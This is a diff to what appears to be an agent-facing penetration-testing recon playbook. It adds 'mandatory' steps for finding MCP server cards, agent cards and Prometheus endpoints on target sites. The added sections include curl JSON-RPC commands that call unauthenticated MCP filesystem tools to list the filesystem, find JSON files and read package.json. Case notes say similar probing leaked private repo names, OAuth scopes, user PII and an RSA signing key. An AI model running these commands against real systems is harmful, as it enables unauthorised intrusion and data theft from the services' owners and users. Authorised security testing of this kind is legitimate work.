@@ -99,6 +99,41 @@ curl -sk --max-time 8 "https://docs.target.com/llms-full.txt" 2>/dev/null | head
 curl -sk --max-time 8 "https://www.target.com/llms.txt" 2>/dev/null | head -100
 ```
 
+**MCP/Agent Protocol Files (MANDATORY check for Mintlify-powered docs):**
+Mintlify docs sites expose MCP server cards, agent cards, and agent skill definitions. These can reveal unauthenticated MCP endpoints with filesystem access (sandboxed), full OpenAPI specs, and internal repository metadata.
+
+```bash
+# Check for MCP and agent protocol endpoints (passive — public docs)
+curl -sk --max-time 8 "https://docs.target.com/.well-known/mcp/server-card.json" 2>/dev/null | head -50
+curl -sk --max-time 8 "https://docs.target.com/.well-known/agent-card.json" 2>/dev/null | head -50
+curl -sk --max-time 8 "https://docs.target.com/.well-known/agent-skills/index.json" 2>/dev/null | head -50
+curl -sk --max-time 8 "https://docs.target.com/.well-known/api-catalog" 2>/dev/null | head -50
+# Also check Link headers for these paths
+curl -sk --max-time 8 -I "https://docs.target.com/" 2>/dev/null | grep -i "link:"
+```
+
+**What to extract from MCP server-card.json:**
+- `url` field → unauthenticated MCP endpoint (e.g., `https://xxx.mintlify.me/mcp`)
+- `authentication: "none"` → no auth required to call the MCP
+- `tools` → available tools (search, filesystem query)
+
+**Exploiting unauthenticated MCP (Uphold, June 2026):**
+If server-card shows `authentication: "none"` with a `query_docs_filesystem` tool:
+```bash
+# List filesystem root
+curl -sk -X POST "$MCP_URL" -H "Content-Type: application/json" \
+  -H "Accept: application/json, text/event-stream" \
+  -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"query_docs_filesystem_TARGET","arguments":{"command":"ls /"}}}'
+
+# Extract full OpenAPI specs
+curl -sk -X POST "$MCP_URL" ... -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"query_docs_filesystem_TARGET","arguments":{"command":"find / -name \"*.json\" | head -20"}}}'
+
+# Read package.json for private repo names
+curl -sk -X POST "$MCP_URL" ... -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"query_docs_filesystem_TARGET","arguments":{"command":"cat /openapi/package.json"}}}'
+```
+
+**Impact:** Internal repo names (private GitHub repos), full OpenAPI specs with all scopes/endpoints, internal package metadata. Sandbox escape unlikely (restricted PATH, no network tools) but document as information disclosure.
+
 **What to extract:** API product names, integration modes (hosted/embedded/API-only), SDK package names (@scope/package), sandbox/test resource URLs, error simulation endpoints. This is pure gold for Phase 3-6 planning.
 
 **Example (Antom, June 2026):** `docs.antom.com/llms.txt` revealed full payment API structure, sandbox URLs, test wallet endpoints, and NPM package name — all without authentication.
@@ -177,6 +212,40 @@ r2 = httpx.get("https://target.com/apple-app-site-association", verify=False)
 ```
 
 **Why this matters (LINE WORKS, June 2026):** `assetlinks.json` revealed 12 Android packages including debug/staging variants. `apple-app-site-association` (at root, NOT .well-known) revealed 9 iOS bundle IDs and 20 deep link paths including `/line-auth/*` — exposing the auth flow structure. Always check BOTH files, and check both `/.well-known/` and root paths.
+
+#### 1c-2. MCP/Agent Protocol Discovery (MANDATORY for developer-facing targets)
+
+Modern platforms expose machine-readable API metadata at well-known paths. These reveal internal infrastructure, tool definitions, and sometimes filesystem access without authentication.
+
+```bash
+# Check for MCP server cards, agent cards, and API catalogs
+for path in "/.well-known/mcp/server-card.json" "/.well-known/agent-card.json" "/.well-known/agent-skills/index.json" "/.well-known/api-catalog" "/llms.txt" "/llms-full.txt"; do
+  code=$(curl -sk --max-time 5 -o /dev/null -w "%{http_code}|%{size_download}" "https://docs.target.com${path}" 2>/dev/null)
+  status=$(echo $code | cut -d'|' -f1)
+  [ "$status" = "200" ] && echo "[+] $path -> $code"
+done
+```
+
+**What to look for in MCP server-card.json:**
+- `url` field → reveals internal Mintlify/docs MCP endpoint
+- `authentication: "none"` → unauthenticated access to MCP tools
+- `tools` array → available tool names (search, filesystem query)
+
+**Uphold lesson (June 2026):** `developer.uphold.com/.well-known/mcp/server-card.json` exposed an unauthenticated MCP server with a `query_docs_filesystem` tool. This sandboxed shell (cat/ls only) leaked: private GitHub repo names (from package.json), full OpenAPI specs (5 APIs), 100+ OAuth scopes, and internal infrastructure details — all without authentication. More valuable than traditional source map analysis when maps are stripped.
+
+**When MCP has filesystem tool:**
+```bash
+# List available files
+curl -sk -X POST "$MCP_URL" -H "Content-Type: application/json" \
+  -H "Accept: application/json, text/event-stream" \
+  -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"query_docs_filesystem_TARGET","arguments":{"command":"ls /"}}}'
+
+# Extract OpenAPI specs
+curl -sk -X POST "$MCP_URL" ... -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"query_docs_filesystem_TARGET","arguments":{"command":"find / -name \"*.json\" | head -20"}}}'
+
+# Check for secrets in package.json
+curl -sk -X POST "$MCP_URL" ... -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"query_docs_filesystem_TARGET","arguments":{"command":"cat /openapi/package.json"}}}'
+```
 
 #### 1d. Wayback Machine (Historical URLs)
 ```bash
@@ -575,6 +644,8 @@ curl -s "https://api.github.com/repos/<org>/<tool-name>" | grep -q "Not Found" &
 
 ## Prometheus URI → Immediate Unauth Testing (when actuator found in P1)
 
+**MANDATORY when actuator/prometheus is found.** This is the #1 missed technique in Phase 1 — every engagement where it was deferred lost Critical findings that would have been caught in minutes.
+
 When `/actuator/prometheus` is discovered during Phase 1 (from JS bundle analysis or path probing), extract URI labels and immediately test ALL discovered paths without authentication. Don't defer to Phase 3 — this yields High-severity findings early.
 
 ```bash
@@ -588,9 +659,11 @@ for uri in $(curl -sk "https://target/actuator/prometheus" | grep -oE 'uri="[^"]
 done
 ```
 
-**LoanPlatform (June 2026):** Prometheus had 50+ URI labels. Batch unauth testing revealed `/user-resources/users/{login}` returning full PII (emails, phones, roles) for 33 users — a High finding invisible to path fuzzing because the endpoint needs a known username in the URL path. Also found `/task-approvals/created-by` leaking the username list needed to exploit it.
+**LoanPlatform (June 2026):** Prometheus had 75+ URI labels. Batch unauth testing revealed `/user-resources/users/{login}` returning full PII (emails, phones, roles) for 33 users — a Critical finding invisible to path fuzzing because the endpoint needs a known username in the URL path. Also found `/task-approvals/created-by` leaking the username list needed to exploit it, `/oauth/token_key` exposing the RSA signing key, `/swagger-resources` pointing to full OpenAPI spec, and `/profile-info/` leaking active Spring profiles.
 
 **Key pattern:** Prometheus URI labels + username leak endpoint = chained user enumeration + PII exposure.
+
+**Execution tip:** Extract URIs with `grep -oE 'uri="[^"]+"' | sed 's/uri="//;s/"//' | sort -u`, then batch-test each. See `references/spring-boot-unauth-recon.md` for the full script. Do NOT defer this to Phase 3 — it yields Critical findings during Phase 1 and the technique is fast (one curl per URI).
 
 ---
 
